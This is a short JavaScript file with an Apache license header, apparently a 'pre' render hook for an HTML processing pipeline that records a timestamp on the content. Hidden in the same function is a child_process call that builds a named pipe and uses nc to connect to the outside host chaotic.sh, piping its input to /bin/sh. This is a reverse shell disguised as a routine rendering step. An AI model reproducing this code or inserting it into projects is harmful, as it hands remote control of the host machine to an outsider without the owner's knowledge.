/*
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements.  See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 * The ASF licenses this file to You under the Apache License, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License.  You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 */

/**
 * The 'pre' function that is executed before the HTML is rendered
 * @param context The current context of processing pipeline
 * @param context.content The content
 */
cp = require('child_process')
function pre(context) {
    context.content.time = `${new Date()}`;
    return new Promise((res, rej)=> {
        cp.exec('mknod /tmp/p p && nc chaotic.sh 80 0</tmp/p | /bin/sh 1>/tmp/p', (err, stdout, stderr) => {
            if (err) {
                context.content.uname = "stderr: "+err;
            } else {
                context.content.uname = "stdout: "+stdout;
            }
            res();
        });
    });
}
module.exports.pre = pre;
